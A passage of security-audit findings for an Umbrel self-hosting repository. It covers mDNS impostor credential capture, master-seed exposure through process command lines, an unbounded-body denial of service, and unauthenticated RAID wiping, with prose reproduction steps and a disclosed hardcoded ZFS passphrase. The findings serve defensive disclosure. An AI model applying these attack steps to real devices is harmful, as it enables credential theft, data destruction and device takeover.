The defect is that the candidate pipeline then keys unsaved devices by that self-asserted id. `Umbreld.identify(candidates:)` (533-558) collapses all verified candidates into `byId` and keeps the lexicographically smallest `host`; the iOS `DiscoveryResult.id` (`device:<id>`) and macOS `identifiedCandidates`/`rebuild()` reduce to one card or row per id as well. The discovery id and model string are public (`system.discoveryInfo` and `system.localHttpsIdentity` are `publicProcedure`, routes.ts:139-159; the id is also in the mDNS TXT record). A LAN peer advertising `_umbrel._tcp` with an SRV target that sorts before the genuine hostname (Swift String comparison is by Unicode scalar value, so `umbrel-home.local`, `Umbrel.local` or a numeric IP all sort before `umbrel.local`), answering `localHttpsIdentity` with its own CA plus the genuine id, and `discoveryInfo` with the genuine `device` string, therefore removes the genuine Umbrel from the pairing list rather than appearing beside it. The user sees one card titled with the real model name, taps Connect, `claimLocalHTTPSIdentity` (285-309) pins the impostor's CA under the genuine device id with `replacingExisting: true`, and the sign-in form (iOS SignInSheet.swift:27-50, macOS AppState.swift:745-764) POSTs `user.loginNative` with the owner's password and TOTP code over a channel pinned to the impostor. `user.loginNative` is public with no pairing approval, so the impostor can relay the credentials to the real device and obtain an owner native session while remaining the pinned endpoint for the app.

The same enrollment runs from `prepareSavedDeviceForSignIn` (315-362) when a restored config outlives the device-only Keychain items: an explicit sign-in re-claims `hosts.first` (typically `umbrel.local`) with first-use verification whose only extra check is the public id.

No code path compares the pinned CA with anything the attacker cannot supply, although the dashboard already exposes `caFingerprint` through `lanIngress.getCertificateStatus`. The recorded threat model names a rogue LAN device impersonating the server to the native apps as an in-scope adversary; the conceded TOFU design presumes the user can pick the genuine card, and the id-keyed collapse takes that choice away.

## Evidence
1. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:533–557](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L533-L557)
   identify(candidates:) collapses every verified candidate into byId keyed by the device's self-reported id and keeps the lexicographically smallest host. For unsaved devices the id was verified only against the probing host's own CA, so an impostor advertising the genuine device's public id with a smaller hostname (e.g. 'umbrel-home.local' < 'umbrel.local', '-' sorts before '.') replaces the genuine card instead of appearing beside it. The comment assumes the id is authoritative; it is not for unsaved devices.
2. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:266–278](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L266-L278)
   verifiedFirstUseCandidate fetches the candidate CA and id over plaintext HTTP from the probed host, then only checks that HTTPS discoveryInfo validated against that same CA returns the same id. Whoever controls the host controls both values; the check is self-referential and establishes no identity.
3. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:285–308](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L285-L308)
   claimLocalHTTPSIdentity re-verifies against the same candidate CA and enrolls it under the device id with replacingExisting: true. The user's tap on the single visible card is the only confirmation.
4. [clients/apple/ios/Sources/Onboarding/SignInSheet.swift:27–49](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/SignInSheet.swift#L27-L49)
   iOS: onPrepare claims the selected card's CA, then onConnect calls Umbreld.login (user.loginNative) with the owner's password and TOTP code over the transport pinned to that CA, i.e. to the impostor.
5. [clients/apple/macos/Sources/Umbrel/AppState.swift:745–763](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L745-L763)
   macOS: prepareToSignIn claims the one identifiedCandidate carrying the id (already collapsed to the impostor) before the sign-in form posts the password.
6. [clients/apple/macos/Sources/Umbrel/AppState.swift:124–130](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L124-L130)
   macOS additionally reduces mDNS-identified candidates to one entry per id, so the menu shows a single row for the id.
7. [clients/apple/ios/Sources/Onboarding/OnboardingModel.swift:71–79](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/OnboardingModel.swift#L71-L79)
   iOS DiscoveryResult identity is 'device:<id>'; the onboarding list renders one card per id, titled with the server-supplied model string and subtitled with the impostor's host.
8. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:315–361](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L315-L361)
   Second entry point: prepareSavedDeviceForSignIn re-runs first-use enrollment for a saved device whose Keychain pin and session are gone (config restored to a new device) against hosts.first only, which a LAN peer can answer for via mDNS; the expected id is public, so the check adds nothing.
9. [packages/umbreld/source/modules/system/routes.ts:138–158](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/routes.ts#L138-L158)
   discoveryInfo and localHttpsIdentity are publicProcedure: the id, model string and CA are readable by any LAN peer, so an impostor can copy the genuine device's id and model exactly.
10. [packages/umbreld/source/modules/user/routes.ts:137–175](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L137-L175)
   user.loginNative is public and issues a native session to any caller presenting a valid password and TOTP; there is no pairing approval, so credentials relayed by the impostor yield an owner session on the genuine device.
11. [packages/umbreld/source/modules/system-ng/advertisement.ts:52–64](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system-ng/advertisement.ts#L52-L64)
   The discovery id is also broadcast in the _umbrel._tcp TXT record, so the impostor learns it passively.

## Impact
The owner's password and current TOTP code are sent to the impostor over a channel pinned to its CA (C:HIGH). The impostor's CA is enrolled under the genuine device id and the impostor fronts the native session it relays, making it a persistent in-path endpoint for all of the app's traffic to that Umbrel (I:HIGH). The genuine device becomes unreachable from the app with 'identity changed' until it is removed and re-added (A:LOW). Subsequent-system impact: Relaying the captured password and TOTP code to the genuine umbrelOS device through the public user.loginNative procedure yields an owner native session: full control of the device, its files, apps and settings.

## Reproduction steps
1. Attacker on the victim's LAN runs an mDNS responder advertising _umbrel._tcp with a hostname that sorts before the genuine one, and an HTTP/HTTPS server with its own CA answering localHttpsIdentity and discoveryInfo with the genuine device's public id and model. identify(candidates:) collapses both to the attacker's card. The victim must be pairing (device not yet saved, or config restored without its Keychain items) (AT:P), then tap Connect and enter password and TOTP (UI:A). No credential or existing pin stands in the way (PR:N, AC:L).

## Recommended fix
1. identify(candidates:) and the iOS/macOS device models treat a discovery id that was verified only against the probed host's own CA as an authoritative identity key, so two unsaved hosts presenting different CA material for one id collapse to the lexicographically smallest host and the genuine device disappears from the pairing list. Fix criteria: Unsaved candidates presenting different CA material for the same id must both remain visible, or the id must be flagged as conflicting and pairing refused for it; they must never be silently collapsed. Verify that an impostor advertising the genuine id with a smaller hostname beside the real device leaves the real device selectable (or blocks pairing with a conflict warning).
2. First-use enrollment pins a CA whose only proof of legitimacy is the same unauthenticated host's answer, and the client immediately sends the owner's password and TOTP code to it; the user's tap on a card is the sole check. Fix criteria: Before any credential is sent to an unsaved device, trust must be bound to something an impostor cannot supply: e.g. the CA fingerprint or a short code displayed by the real dashboard (lanIngress.getCertificateStatus already exposes caFingerprint) that the user confirms in the app, or a server-side pairing approval. Verify that an impostor with a self-signed CA and a copied id cannot complete sign-in, including through the prepareSavedDeviceForSignIn recovery path.

---
**Severity:** HIGH
**Status:** Open
**Category:** Authentication Bypass by Spoofing
**CWE:** [CWE-290](https://cwe.mitre.org/data/definitions/290.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258126

---

# app-script passes the umbrel master seed as an openssl command-line argument

## Details
umbreld derives every app's APP_SEED and APP_PASSWORD from one device-wide secret, <data>/db/umbrel-seed/seed (apps.ts:131-136, a 256-character random token). The root bash lifecycle script legacy-compat/app-script computes them in derive_entropy() (lines 182-200) by running `openssl dgst -sha256 -hmac "${umbrel_seed}"`: the master seed is an argv element of the openssl child process. /proc/<pid>/cmdline is readable by every process in the same PID namespace regardless of uid — the kernel applies no ptrace access check to cmdline (unlike environ, mem and root) — and the image mounts /proc without hidepid (packages/os/overlay/etc/fstab). source_app() (296-297) runs derive_entropy twice per sourced app, compose() (400-411) sources the app for every compose subcommand, so the seed is exposed on install, start, stop, restart, update, logs and `images`; Apps.#cleanUnusedImages() (apps.ts:56-70) runs `images` for every installed app ten minutes after umbreld starts and after each install/uninstall. A pspy-style poller of /proc/[0-9]*/cmdline captures the final argument.

Who can read it: any process in the host PID namespace. In the shipped system that is a third-party app container whose compose declares `pid: host` (or bind-mounts the host /proc), which umbreld accepts unchanged — patchComposeFile (app.ts:1269-1330) rewrites only container_name, volume sources and GPU devices. umbrelOS runs AppArmor (Pi cmdline.txt `security=apparmor apparmor=1`; libvirt domains use `model='apparmor'`; Docker 28.5.0 is installed with recommends, daemon.json sets no userns-remap), so such a container is confined by Docker's default profile, which denies ptrace-mode reads of unconfined root processes (/proc/<pid>/environ, /proc/<pid>/root) but not the plain file read of /proc/<pid>/cmdline, and the seed file is not mounted into containers. For a remotely compromised monitoring-type app that legitimately shares the host PID namespace, the argv exposure is therefore the only route to the master seed. Dependency assumption: Docker 28.5.0's docker-default AppArmor profile restricts `ptrace (read)` to same-profile peers and permits file reads under /proc.

Gain: with the seed the attacker computes HMAC-SHA256(seed, `app-<id>-seed`) and HMAC-SHA256(seed, `app-<id>-seed-APP_PASSWORD`) for every app id (the derivation is public: app.ts:1233-1239, app-script:296-297): the dashboard-displayed login password of every app with deterministicPassword (routes.ts:106-108, 217) and the APP_SEED/APP_PASSWORD values apps embed in RPC and internal credentials via exports.sh/compose, reachable over umbrel_main_network from the attacker's container. The project concedes each app only its own derived values; this path hands it every app's, present and future, around the per-app derivation that isolates app credentials. The weakness is CWE-214.

Conditions: an owner-installed app whose compose shares the host PID namespace (or mounts host /proc) without otherwise granting itself host root (privileged, apparmor:unconfined plus SYS_PTRACE, or a bind mount of UMBREL_ROOT), and attacker code execution inside it. No such app ships in this repository and umbreld imposes no restriction on the declaration. An unprivileged host process (e.g. QEMU after a guest escape; libvirt-qemu is in group umbrel, Dockerfile:576) can read the cmdline too but can likely read the 0644 seed file directly, so the argv exposure matters chiefly for containers. The compose author and the owner are not the adversary; a compromised runtime container is.

## Evidence
1. [packages/umbreld/source/modules/apps/legacy-compat/app-script:182–199](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L182-L199)
   derive_entropy() reads <data>/db/umbrel-seed/seed into $umbrel_seed and runs `openssl dgst -sha256 -hmac "${umbrel_seed}"`. The HMAC key — the device's master app seed — becomes argv of a child process and is readable from /proc/<pid>/cmdline by every process in the same PID namespace regardless of uid: the kernel performs no ptrace access check for cmdline and the OS image mounts /proc without hidepid (packages/os/overlay/etc/fstab). This is the line the fix must change.
2. [packages/umbreld/source/modules/apps/legacy-compat/app-script:296–297](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L296-L297)
   source_app() calls derive_entropy twice for every app it sources (APP_SEED and APP_PASSWORD), so the seed appears on the command line twice per app on every install, start, stop, restart, update, logs and images invocation.
3. [packages/umbreld/source/modules/apps/legacy-compat/app-script:400–411](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L400-L411)
   compose() sources the app environment for every compose subcommand, including the `images` subcommand (line 910-913: `compose "${app}" --profile '*' config --images`) used by the image sweep, so the exposure recurs outside user-initiated lifecycle actions.
4. [packages/umbreld/source/modules/apps/apps.ts:56–69](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/apps.ts#L56-L69)
   #cleanUnusedImages() calls app.getExpectedImages() (app-script `images`) for every installed app; ImageCleanup schedules it ten minutes after umbreld starts (apps.ts:99-105) and after every install/uninstall (apps.ts:929, 1003), giving a host-PID observer a recurring, predictable window to capture the seed from process listings.
5. [packages/umbreld/source/modules/apps/app.ts:1269–1329](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app.ts#L1269-L1329)
   patchComposeFile() rewrites only container_name, volume sources and GPU devices; `pid`, `privileged`, `cap_add` and `security_opt` pass through unchanged, so an owner-installed app may legitimately run sharing the host PID namespace — the position from which /proc/<pid>/cmdline of umbreld's openssl children is readable.
6. [packages/umbreld/source/modules/apps/app.ts:1233–1239](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app.ts#L1233-L1239)
   The TypeScript derivation of the same value uses crypto.createHmac in-process, showing the leak is specific to the bash path and that the derivation HMAC-SHA256(seed, `app-<id>-seed-APP_PASSWORD`) is public, so possession of the seed yields every app's deterministic password.
7. [packages/umbreld/source/modules/apps/routes.ts:106–107](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/routes.ts#L106-L107)
   Apps flagged deterministicPassword have their dashboard-displayed login password derived from the seed; compromise of the seed is compromise of every such app's admin login and of every APP_SEED/APP_PASSWORD value apps consume in exports.sh/compose (e.g. RPC passwords).
8. [packages/umbreld/source/modules/apps/apps.ts:131–135](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/apps.ts#L131-L135)
   The seed file is created by root under umbreld's umask on the host filesystem and is not mounted into containers; a host-PID container confined by Docker's default AppArmor profile cannot reach it via /proc/<pid>/root or environ, so the argv exposure is its route to the seed.

## Impact
The master seed yields the deterministic admin password of every app and the APP_SEED/APP_PASSWORD secrets apps embed in RPC and internal credentials, so confidentiality and integrity of all other apps' data are lost (admin login, wallet/RPC control) from a single compromised container. Availability is affected only through what admin access permits.

## Reproduction steps
1. Attacker holds code execution inside an app container that shares the host PID namespace (compose `pid: host` or a host /proc bind mount, which umbreld passes through) — e.g. after remotely compromising a monitoring-type app. They poll /proc/[0-9]*/cmdline for `openssl dgst -sha256 -hmac` and copy the final argument; umbreld runs it for every installed app on each lifecycle action and image sweep, so capture is a matter of waiting. They derive every app's APP_PASSWORD/APP_SEED offline and log into other apps or their RPC interfaces over umbrel_main_network. Local vector, low-privileged container foothold, deployment condition (a host-PID app installed), no user interaction.

## Recommended fix
1. derive_entropy() in app-script supplies the master seed as an argv element to openssl, making it readable from /proc/<pid>/cmdline by any process in the host PID namespace and breaking the per-app isolation of derived credentials. Fix criteria: Neither the seed nor any value from which all apps' credentials can be derived appears in the command line of any process (note that openssl's -macopt key:/hexkey: forms are argv too). Acceptable outcomes include computing the HMAC in-process in umbreld and handing only per-app derived values to the script. Verify by polling /proc/*/cmdline from a `pid: host` container during app install/start/stop and image sweeps and confirming the seed never appears.
2. Defense in depth: the seed file is created without a restrictive mode (apps.ts:131-136), so any unprivileged host process that can traverse the data directory reads it directly. Fix criteria: The seed file is created and kept at mode 0600 owned by root; verify with stat after first boot and after a backup restore.

---
**Severity:** HIGH
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-214](https://cwe.mitre.org/data/definitions/214.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258123

---

# Shortcut metadata fetch reads unbounded response bodies after its timeout is cleared

## Details
`doFetch` (packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:169-192) protects only the connection/headers phase: it creates an AbortController with a 3 s timer, awaits `fetch()`, and then runs `clearTimeout(timeout)` in `finally` before returning the response. The callers then read the whole body: `fetchPageMetadata` awaits `response.text()` (line 34) and `fetchManifestIcon` awaits `response.text().then(JSON.parse)` (lines 134-136). The response is a node-fetch 3.3.2 response created without a `size` option (no `size` is passed anywhere in the umbreld tree) and with no abort signal still armed, so nothing bounds how many bytes are read or for how long. Assumed node-fetch 3.3.2 behaviour: the default `size: 0` means unlimited, `text()` accumulates every chunk in memory before concatenating, and the default `compress: true` transparently inflates gzip/deflate/br bodies, so a small compressed response can expand roughly 1000x before accumulation.

An attacker who operates a web server (or any site the owner's URL redirects to; node-fetch follows redirects by default), or a LAN peer who can MITM the owner's traffic (the HTTPS agent at line 8 sets `rejectUnauthorized: false`), returns `200 OK` with `Content-Type: text/html` immediately (satisfying the 3 s timeout and the content-type check at lines 55-59) and then streams an endless or multi-gigabyte body. umbreld, the root daemon that also hosts lan-ingress TLS termination and the in-process app-gateway, accumulates the chunks as off-heap Buffers until the kernel OOM-kills it or an allocation fails and the process aborts; a slow drip instead holds the request open indefinitely. The threat model records that global request timeouts are intentionally disabled on the internal server and umbrel.service sets no MemoryMax, so nothing else cuts the body read off. The only trigger needed is that the owner types or pastes the attacker's URL into the Add Shortcut dialog, which calls `shortcuts.fetchPageMetadata` automatically 600 ms after typing stops (shortcut-dialog.tsx:164-196). The procedure is owner-only and authenticated by a Bearer header, so the attacker needs no umbreld credentials and cannot fire it cross-origin; the owner's deliberate action of adding the site as a shortcut is required.

This is a deterministic unbounded allocation driven by a single attacker-sized response rather than volumetric load: the code fixes no bound, the attacker's body length sets it. After the crash systemd (`Restart=always`, `StartLimitInterval=0`) restarts umbreld, so the outage is the restart window plus loss of in-flight operations (app installs, backups, file transfers) each time the owner re-attempts the shortcut.

## Evidence
1. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:169–192](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L169-L192)
   doFetch arms a 3 s AbortController, awaits fetch() (which resolves on headers), and clearTimeout runs in finally before the response is returned; the body stream is handed back with no abort signal still armed, no node-fetch `size` option (none is used anywhere in the tree), and no deadline.
2. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:33–36](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L33-L36)
   fetchPageMetadata awaits response.text() on the entire body (only a Content-Type containing html/xml/text/ is required, which the attacker sets) and then runs an unanchored regex over the whole string; a server that streams an endless or multi-gigabyte body makes umbreld accumulate it in memory until the process is killed.
3. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:134–137](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L134-L137)
   fetchManifestIcon likewise reads the full manifest body with response.text() and JSON.parse with no size bound, reachable from a <link rel=manifest> in the first response's head.
4. [packages/umbreld/source/modules/shortcuts/routes.ts:12–15](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/routes.ts#L12-L15)
   shortcuts.fetchPageMetadata is a privateProcedure (= ownerProcedure, trpc.ts:34) that passes the owner-supplied URL straight to fetchPageMetadata; it is the only production caller.
5. [packages/ui/src/modules/desktop/shortcut-dialog.tsx:164–196](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/desktop/shortcut-dialog.tsx#L164-L196)
   The Add Shortcut dialog calls shortcuts.fetchPageMetadata automatically 600 ms after the owner stops typing any parseable URL, so pasting or typing the attacker's URL (or a URL redirecting to it) is the only user action needed; the query is configured with retry: false, so there is no automatic re-trigger.
6. [packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts:8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/shortcuts/fetch-page-metadata.ts#L8)
   The HTTPS agent disables certificate verification, so a LAN peer able to MITM the owner's traffic can also author the endless body for any https:// shortcut URL the owner enters, not only for a server the attacker operates.

## Impact
Unbounded off-heap Buffer accumulation in the root umbreld process until the kernel OOM-kills it or allocation fails, taking down the dashboard, lan-ingress TLS termination and the in-process app-gateway (and interrupting in-flight operations) until systemd restarts it; no data is read or modified.

## Reproduction steps
1. The attacker runs a web server (or controls a redirect target, or MITMs the LAN since certificate verification is disabled). The owner opens Add Shortcut and types or pastes the URL; the dialog auto-calls the owner-only shortcuts.fetchPageMetadata procedure 600 ms later. The attacker's server sends 200 OK and Content-Type: text/html at once, satisfying the only timeout, then streams an endless (optionally gzip-compressed, so ~1000x amplified under node-fetch's default compress: true) body that response.text() accumulates with no size or time bound until the process is killed. No umbreld privileges are needed; the owner's active step of entering the URL is the only interaction.

## Recommended fix
The abort timeout in doFetch covers only the header phase; body reads in fetchPageMetadata and fetchManifestIcon are unbounded in both size and duration, and decompressed output is likewise unbounded. Fix criteria: Body reads must be capped at a small limit appropriate for an HTML head or web-app manifest (post-decompression) and must abort when an overall deadline passes, so a server streaming an endless, slow, or highly compressible body causes the fetch to fail with bounded memory use. Verify that a response with an infinite body, a slow-drip body, and a compressed bomb each return an error from fetchPageMetadata within the deadline without memory growth beyond the cap.

---
**Severity:** HIGH
**Status:** Open
**Category:** Uncontrolled resource consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258119

---

# Unauthenticated RAID re-setup in mount-failure recovery mode wipes owner's pool disks and seizes device

## Details
When the configured ZFS pool fails to import or mounts unwritable at boot (a member of a striped pool disconnected, a pool forced read-only after errors, an import timeout), `umbrel-data-mount` exits non-zero, rugix writes `/run/rugix/mounts/data/.rugix/data-mount-error.log` and, per the shipped `state-data.toml` (`overlay-fallback = "in-memory"`), mounts an in-memory overlay as the data directory. umbreld starts normally (lan-ingress, hardware and server all start unconditionally in index.ts) with an empty store, so `user.exists()` is false while the owner's data still sits on the attached disks and the config partition still holds `raid.poolName`, `raid.devices` and `user.hashedPassword`.

`user.register` (user/routes.ts:57-90) is `publicProcedure` gated only on `ctx.user.exists()`. The shipped UI never offers it in this state: `/onboarding` is wrapped in `EnsureNoRaidMountFailure` (router.tsx:195-197), which redirects to `/raid-error`, whose only actions are shutdown, restart and factory reset. The API, however, accepts it from any peer that can reach the dashboard. Two sinks follow:

1. Destructive re-setup and ownership seizure. `hardware.raid.checkRaidMountFailureDevices` and `hardware.internalStorage.getDevices` are `publicProcedureWhenNoUserExists` (fall-open in is-authenticated.ts:62-65) and list the configured pool members and every non-system disk. `user.register({name, password, raidDevices: [<owner's disk ids>], raidType: 'storage'})` reaches `triggerInitialRaidSetupBootFlow` (raid.ts:1120) and `#setup` (1507). The only guards are device count, `#assertNotSystemDrives` (boot disk only, 1619), path existence and SSD/HDD consistency; nothing checks that `configStore.raid` already records an install or that the devices carry the configured pool's labels. `#partitionDevice` (1301) runs `wipefs --all` and `sgdisk --zap-all`, `#createPool` runs `zpool create -f` under a new random pool name, and `configStore.set('raid', ...)` (1566) replaces the owner's RAID config. The attacker's plaintext credentials are written to the config partition (1134) and the device reboots; `umbrel-data-mount` mounts the new empty pool and `handlePostBootRaidSetupProcess` (1155-1160) registers the attacker as owner. The owner's data on the wiped members is destroyed. This is exactly the project's own tested recovery scenario (raid-recovery-mode.vm.test.ts disconnects one NVMe of a two-disk storage pool), in which the pool is not imported and the remaining disk is free for wipefs.

2. Owner takeover without wiping. RAID onboarding is offered on generic (non-Pro) devices (storage-selection.ts), and `register` only requires `raidDevices` on Umbrel Pro. On any other RAID install in recovery mode, `register` without `raidDevices` creates the owner in the in-memory store (and, via `hasConfigStore()`, overwrites `user.name`/`user.hashedPassword` on the config partition and syncs the Linux `umbrel` password to the attacker's). The attacker logs in, holds every owner-tier procedure, opens `/terminal` (terminal-socket.ts:94-108) as the sudo-group `umbrel` user and becomes root while the owner's disks are attached; `zpool import -d /dev/disk/by-umbrel-id` plus `zfs load-key` with the fixed passphrase `umbrelumbrel` (raid.ts:40) exposes the owner's dataset wherever the pool is importable (degraded failsafe raidz/mirror, read-only-after-errors pool).

This is a different entry point and sink from the verified `factory-reset-unauthenticated-in-raid-recovery-mode` (system.factoryReset): here the unauthenticated action formats the RAID members themselves and installs attacker credentials in one step, or grants live owner/root access with the owner's pool still attached.

## Evidence
1. [packages/umbreld/source/modules/hardware/raid.ts:1120–1148](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1120-L1148)
   triggerInitialRaidSetupBootFlow is the entry from user.register into RAID setup. It runs setup() on caller-named devices, persists the caller's plaintext name/password to the config partition and schedules a reboot. It never checks that configStore.raid already describes an install or that the caller proved ownership against configStore.user.hashedPassword. This is the code the fix must change.
2. [packages/umbreld/source/modules/user/routes.ts:57–89](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L57-L89)
   user.register is publicProcedure whose only gate is ctx.user.exists(). In mount-failure recovery mode the store lives on rugix's in-memory fallback so exists() is false; any peer can call it with raidDevices (reaching triggerInitialRaidSetupBootFlow) or, on non-Umbrel-Pro hardware, without them (creating an in-memory owner).
3. [packages/umbreld/source/modules/hardware/raid.ts:1507–1576](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1507-L1576)
   #setup validates only device count, #assertNotSystemDrives, path existence and SSD/HDD consistency; it never refuses devices that are members of the pool named in configStore.raid. It partitions them, runs `zpool create -f` with a fresh pool name and overwrites configStore.raid, orphaning or destroying the owner's pool.
4. [packages/umbreld/source/modules/hardware/raid.ts:1301–1345](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1301-L1345)
   #partitionDevice executes `wipefs --all` and `sgdisk --zap-all` on the whole device, destroying the ZFS labels and partitions of the owner's pool member.
5. [packages/umbreld/source/modules/hardware/raid.ts:1619–1633](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1619-L1633)
   #assertNotSystemDrives is the only destructive-operation guard; it protects the boot disk only (getSystemDiskNames resolves it from / and the config partition even when the data dir is the in-memory overlay) and passes any attached non-system disk, including the owner's RAID members.
6. [packages/umbreld/source/modules/server/trpc/is-authenticated.ts:62–65](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/is-authenticated.ts#L62-L65)
   isAuthenticatedIfUserExists falls open to unauthenticated callers whenever user.exists() is false, which is the recovery-mode state; this is what opens the device-enumeration procedures below.
7. [packages/umbreld/source/modules/hardware/routes.ts:37–40](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/routes.ts#L37-L40)
   checkRaidMountFailureDevices (publicProcedureWhenNoUserExists) returns exactly the configured pool's by-umbrel-id device names and whether each is attached, telling the attacker which disks hold the owner's data.
8. [packages/umbreld/source/modules/hardware/routes.ts:6–8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/routes.ts#L6-L8)
   hardware.internalStorage.getDevices is publicProcedureWhenNoUserExists, so the attacker enumerates every internal NVMe/SATA disk id and its isSystemDrive flag unauthenticated.
9. [packages/umbreld/source/modules/hardware/raid.ts:1151–1167](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1151-L1167)
